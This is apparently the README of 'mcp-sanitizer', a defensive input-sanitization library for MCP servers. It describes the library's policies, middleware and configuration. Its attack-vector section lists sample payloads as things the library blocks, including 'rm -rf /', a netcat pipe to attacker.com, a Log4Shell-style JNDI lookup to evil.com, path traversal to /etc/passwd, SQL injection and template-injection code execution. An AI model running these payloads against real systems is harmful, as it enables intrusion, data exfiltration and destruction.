# MCP Sanitizer

A comprehensive security sanitization library for Model Context Protocol (MCP) servers, designed to prevent common attack vectors including command injection, SQL injection, directory traversal, prototype pollution, and code execution attempts.

[![npm version](https://badge.fury.io/js/mcp-sanitizer.svg)](https://badge.fury.io/js/mcp-sanitizer)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Security Coverage](https://img.shields.io/badge/Security%20Coverage-100%25-brightgreen)](./benchmark/README.md)
[![Attack Vectors Blocked](https://img.shields.io/badge/Attack%20Vectors%20Blocked-42%2F42-brightgreen)](./benchmark/advanced-security-benchmark.js)

## 🔒 Security Posture

**Version 1.1.0** - Production Ready with 100% attack vector coverage

- ✅ **100% XSS Protection** - All 13 vectors blocked
- ✅ **100% SQL Injection Protection** - All 10 vectors blocked  
- ✅ **100% Command Injection Protection** - All 10 vectors blocked
- ✅ **100% Path Traversal Protection** - All 9 vectors blocked
- ✅ **Timing Attack Resistant** - <2% variance (prevents side-channel attacks)
- ✅ **Unicode/Encoding Defense** - Handles `\uXXXX`, URL encoding, HTML entities
- ✅ **Memory Safe** - Bounded at <100MB under attack

## Features

- **Multi-layered Protection**: Guards against command injection, SQL injection, XSS, prototype pollution, and template injection
- **Advanced Decoding Layer**: Pre-processes Unicode, URL encoding, and control characters before validation
- **Context-aware Sanitization**: Different validation rules for file paths, URLs, commands, and SQL queries
- **Trusted Security Libraries**: Built on industry-standard libraries like `escape-html`, `sqlstring`, `shell-quote`, `validator`, `sanitize-filename`, and `path-is-inside`
- **Framework Integration**: Ready-to-use middleware for Express, Fastify, and Koa with `skipPaths` support
- **Security Policies**: Pre-configured policies (STRICT, MODERATE, PERMISSIVE, DEVELOPMENT, PRODUCTION)
- **Timing Attack Mitigation**: Optional timing protection with configurable random delays
- **Configurable & Extensible**: Fluent API and comprehensive configuration options
- **High Performance**: Sub-millisecond operations with optional caching
- **Comprehensive Testing**: 230+ tests covering attack vectors and edge cases

## Installation

```bash
npm install mcp-sanitizer
```

## Quick Start

```javascript
const MCPSanitizer = require('mcp-sanitizer');

// Use default configuration
const sanitizer = new MCPSanitizer();

// Or use a security policy
const strictSanitizer = new MCPSanitizer('STRICT');

// Sanitize MCP tool call
const toolCall = {
  name: "file_reader",
  parameters: {
    file_path: "../../../etc/passwd"  // Malicious input
  }
};

const result = sanitizer.sanitize(toolCall);
if (result.blocked) {
  console.log('Attack blocked:', result.warnings);
} else {
  console.log('Safe input:', result.sanitized);
}
```

## Security Policies

The MCP Sanitizer includes five pre-configured security policies:

| Policy | Use Case | String Limit | Protocols | Blocking Level |
|--------|----------|--------------|-----------|----------------|
| **STRICT** | High-security, untrusted input | 1,000 chars | HTTPS only | Medium+ |
| **MODERATE** | Balanced production security | 5,000 chars | HTTP, HTTPS, MCP | High+ |
| **PERMISSIVE** | Trusted environments | 50,000 chars | HTTP, HTTPS, FTP, MCP, File | Critical only |
| **DEVELOPMENT** | Development with debugging | 20,000 chars | HTTP, HTTPS, MCP, File | High+ |
| **PRODUCTION** | Production environments | 8,000 chars | HTTPS, MCP | High+ |

```javascript
// Use a security policy
const sanitizer = new MCPSanitizer('PRODUCTION');

// Use policy with customizations
const customSanitizer = new MCPSanitizer({
  policy: 'MODERATE',
  maxStringLength: 15000,
  allowedProtocols: ['https', 'mcp'],
  enableTimingProtection: true  // New: Prevent timing attacks
});
```

## What's New in v1.1.0 🚀

- **Advanced Security Decoder**: New `security-decoder.js` module handles Unicode, URL encoding, and control characters
- **Timing Attack Protection**: Optional timing noise to prevent side-channel attacks
- **Enhanced Path Validation**: Better Windows path normalization and absolute path blocking
- **skipPaths Support**: Middleware can now skip sanitization for specific routes (health checks, metrics, etc.)
- **Improved Coverage**: From 76.2% to 100% attack vector blocking
- **Performance Optimizations**: O(1) path matching for skipPaths feature

See [Security Improvements](./docs/SECURITY_IMPROVEMENTS.md) for detailed changes.

## Framework Middleware

### Express.js

```javascript
const express = require('express');
const { createMCPMiddleware } = require('mcp-sanitizer');

const app = express();
app.use(express.json());

// Auto-detect framework and apply middleware
app.use(createMCPMiddleware());

// Or specify configuration
app.use(createMCPMiddleware({
  policy: 'PRODUCTION',
  mode: 'sanitize', // or 'block'
  skipPaths: ['/health', '/metrics'],  // New: Skip sanitization for these paths
  enableTimingProtection: true
}));

app.post('/tools/:toolName/execute', (req, res) => {
  // req.body is now sanitized
  // req.sanitizationWarnings contains any warnings
});
```

### Fastify

```javascript
const fastify = require('fastify')();
const { createFastifyPlugin } = require('mcp-sanitizer');

// Register as plugin
fastify.register(createFastifyPlugin({
  policy: 'MODERATE'
}));
```

### Koa

```javascript
const Koa = require('koa');
const { createKoaMiddleware } = require('mcp-sanitizer');

const app = new Koa();
app.use(createKoaMiddleware({
  policy: 'STRICT'
}));
```

## Configuration Options

### Using Configuration Builder (Fluent API)

```javascript
const { createConfigBuilder } = require('mcp-sanitizer');

const config = createConfigBuilder()
  .usePolicy('MODERATE')
  .maxStringLength(20000)
  .allowProtocols(['https', 'mcp'])
  .allowFileExtensions(['.txt', '.json', '.md', '.csv'])
  .blockOnSeverity('high')
  .strictMode(true)
  .patternDetection({
    enableCommandInjection: true,
    enableSQLInjection: true,
    enablePrototypePollution: true,
    enableTemplateInjection: false
  })
  .build();

const sanitizer = new MCPSanitizer(config);
```

### Direct Configuration

```javascript
const sanitizer = new MCPSanitizer({
  // Limits
  maxStringLength: 10000,
  maxDepth: 10,
  maxArrayLength: 1000,
  maxObjectKeys: 100,
  
  // Security
  allowedProtocols: ['https', 'mcp'],
  allowedFileExtensions: ['.txt', '.json', '.md'],
  blockOnSeverity: 'high',
  strictMode: false,
  
  // Patterns
  blockedPatterns: [
    /\$\{.*?\}/g,     // Template injection
    /__proto__/gi,    // Prototype pollution
    /require\s*\(/gi  // Code execution
  ],
  
  // Context-specific settings
  contextSettings: {
    url: {
      allowPrivateIPs: false,
      allowLocalhostWithoutPort: false
    },
    filePath: {
      allowAbsolutePaths: false,
      allowedDirectories: ['./data']
    }
  }
});
```

## Supported Attack Vectors

### Directory Traversal
- `../../../etc/passwd`
- `..\\windows\\system32\\config`
- `/proc/version`, `/sys/class/net`

### Command Injection
- `ls; rm -rf /`
- `command && malicious_command`
- `ls | nc attacker.com 4444`

### SQL Injection
- `'; DROP TABLE users;--`
- `UNION SELECT * FROM passwords`
- `EXEC xp_cmdshell('dir')`

### Prototype Pollution
- `{"__proto__": {"isAdmin": true}}`
- `{"constructor": {"prototype": {"polluted": true}}}`

### Template Injection
- `{{constructor.constructor('return process')()}}`
- `${jndi:ldap://evil.com/x}`
- `<%= require("child_process").exec("whoami") %>`

### Code Execution
- `require('fs').readFileSync('/etc/passwd')`
- `eval("malicious_code")`
- `Function("return process")()`

## API Reference

### `new MCPSanitizer(options?)`

Create a new sanitizer instance.

**Parameters:**
- `options`: Configuration object, security policy name, or policy with customizations

### `sanitizer.sanitize(input, context?)`

Sanitizes input data and returns a result object.

**Parameters:**
- `input`: The data to sanitize (any type)
- `context`: Optional context object with `type` field

**Returns:**
```javascript
{
  sanitized: any,     // Sanitized data (null if blocked)
  warnings: string[], // Array of warning messages
  blocked: boolean    // True if input was blocked
}
```

**Context Types:**
- `file_path`: Apply file path validation
- `url`: Apply URL validation  
- `command`: Apply command validation
- `sql`: Apply SQL query validation

### Specialized Methods

```javascript
// Sanitize specific input types
sanitizer.sanitizeFilePath('/path/to/file');
sanitizer.sanitizeURL('https://example.com');
sanitizer.sanitizeCommand('ls -la');
sanitizer.sanitizeSQL('SELECT * FROM users WHERE id = ?');
```

### Configuration Methods

```javascript
// Get configuration summary
const summary = sanitizer.getConfigSummary();

// Update configuration at runtime
sanitizer.updateConfig({
  maxStringLength: 25000
});

// Apply new security policy
sanitizer.applyPolicy('STRICT', {
  maxStringLength: 5000 // Override
});

// Check environment compatibility
const compatibility = sanitizer.checkEnvironmentCompatibility('production');
```

## Security Libraries Used

The MCP Sanitizer leverages trusted, industry-standard security libraries:

- **[escape-html](https://github.com/component/escape-html)** - HTML entity encoding (3-4x faster than regex)
- **[sqlstring](https://github.com/mysqljs/sqlstring)** - MySQL-compatible SQL escaping
- **[shell-quote](https://github.com/substack/node-shell-quote)** - Shell command escaping
- **[validator](https://github.com/validatorjs/validator.js)** - String validation and sanitization
- **[sanitize-filename](https://github.com/parshap/node-sanitize-filename)** - Filename sanitization
- **[path-is-inside](https://github.com/domenic/path-is-inside)** - Path containment checking

## Testing

```bash
# Run tests
npm test

# Run with coverage
npm run test:coverage

# Watch mode
npm run test:watch

# Security audit
npm run security-audit
```

## Performance

- **Low Latency**: All operations complete in <0.5ms
- **Memory Efficient**: Configurable limits prevent memory exhaustion
- **Scalable**: Stateless design allows horizontal scaling
- **Optimized**: Using C++ backed libraries where available

## Examples

### Environment-based Configuration

```javascript
const { createRecommendedConfig } = require('mcp-sanitizer');

// Get recommended configuration for your environment
const { config, metadata } = createRecommendedConfig('production', 'low');
console.log(metadata.rationale); // Why this policy was recommended

const sanitizer = new MCPSanitizer(config);
```

### Custom Security Patterns

```javascript
const sanitizer = new MCPSanitizer({
  blockedPatterns: [
    // Default patterns plus custom ones
    /bitcoin|cryptocurrency/i,  // Block crypto content
    /\b\d{16}\b/,              // Block credit card numbers
    /password|secret|token/i    // Block sensitive keywords
  ],
  sqlKeywords: [
    // Add custom SQL keywords
    'MERGE', 'UPSERT', 'BULK'
  ]
});
```

### MCP Tool Parameter Validation

```javascript
// Before executing file operations
const pathResult = sanitizer.sanitize(params.file_path, { type: 'file_path' });
if (pathResult.blocked) {
  throw new Error('Invalid file path');
}

// Before making HTTP requests
const urlResult = sanitizer.sanitize(params.url, { type: 'url' });
if (urlResult.blocked) {
  throw new Error('Invalid or restricted URL');
}
```

## Security Considerations

- **Defense in Depth**: Use sanitization as one layer of your security strategy
- **Input Validation**: Always validate inputs at the edge of your system
- **Output Encoding**: Consider output context when displaying sanitized data
- **Rate Limiting**: Implement rate limiting alongside input sanitization
- **Logging**: Log blocked attempts for security monitoring
- **Regular Updates**: Keep the library updated for new attack patterns

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Write tests for new functionality
4. Ensure all tests pass (`npm test`)
5. Lint your code (`npm run lint`)
6. Commit your changes (`git commit -m 'Add amazing feature'`)
7. Push to the branch (`git push origin feature/amazing-feature`)
8. Open a Pull Request

## Security

### 🛡️ Security Testing

Run comprehensive security benchmarks to validate protection:

```bash
# Run all benchmarks
npm run benchmark

# Run security-specific benchmark (42 attack vectors)
node benchmark/advanced-security-benchmark.js

# Run performance benchmarks
node benchmark/library-performance.js
node benchmark/skip-paths-performance.js
```

### 📊 Current Security Metrics

- **Attack Vector Coverage**: 100% (42/42 vectors blocked)
- **XSS Protection**: 100% (13/13 vectors)
- **SQL Injection Protection**: 100% (10/10 vectors)
- **Command Injection Protection**: 100% (10/10 vectors)
- **Path Traversal Protection**: 100% (9/9 vectors)
- **Timing Attack Resistance**: <2% variance
- **Memory Usage Under Attack**: <100MB bounded

See [Security Status](./docs/SECURITY_STATUS.md) for detailed vulnerability analysis.

### 🔒 Security Best Practices

1. **Always use STRICT or PRODUCTION policy for untrusted input**
2. **Enable timing protection for sensitive operations**
3. **Regularly update to get latest security patches**
4. **Test with your specific attack vectors**
5. **Monitor sanitization warnings and blocked attempts in production**

### 📝 Security Documentation

- [Security Status Report](./docs/SECURITY_STATUS.md) - Current vulnerabilities and mitigations
- [Security Improvements](./docs/SECURITY_IMPROVEMENTS.md) - v1.1.0 security enhancements
- [Benchmark Documentation](./benchmark/README.md) - Performance and security testing

## Security Reporting

If you discover a security vulnerability, please email security@mcp-sanitizer.org instead of using the public issue tracker. We follow responsible disclosure practices and will credit researchers.

## License

MIT License - see [LICENSE](LICENSE) file for details.

## Changelog

### v1.1.0 (2025-08-23) - Security Hardening Release
- 🔒 **Security Coverage**: Improved from 76.2% to 100% attack vector blocking
- 🛡️ **Advanced Decoder**: New `security-decoder.js` module for Unicode/URL/HTML entity decoding
- ⏱️ **Timing Attack Protection**: Added configurable timing noise (<2% variance achieved)
- 📁 **Path Security**: Enhanced Windows path normalization and absolute path blocking
- 🚀 **skipPaths Feature**: Middleware can skip sanitization for specific routes (O(1) performance)
- 🔍 **Command Validation**: Blocks access to sensitive files (/etc/passwd, .ssh/, .aws/, etc.)
- 📊 **Security Benchmarks**: Added advanced-security-benchmark.js with 42 attack vectors
- 📝 **Documentation**: Comprehensive security status and improvement documentation

### v1.0.0
- Initial release with comprehensive security features
- Integrated trusted security libraries (escape-html, sqlstring, shell-quote, validator, sanitize-filename, path-is-inside)
- Pre-configured security policies (STRICT, MODERATE, PERMISSIVE, DEVELOPMENT, PRODUCTION)
- Middleware support for Express, Fastify, and Koa
- Fluent configuration builder API
- High performance (sub-millisecond operations)
- Comprehensive test suite (230+ tests)
- Support for all major attack vector prevention

## Related Projects

- [Model Context Protocol](https://github.com/anthropics/model-context-protocol)
- [OWASP Input Validation](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

Built with ❤️ for the MCP community. Secured with industry-standard libraries.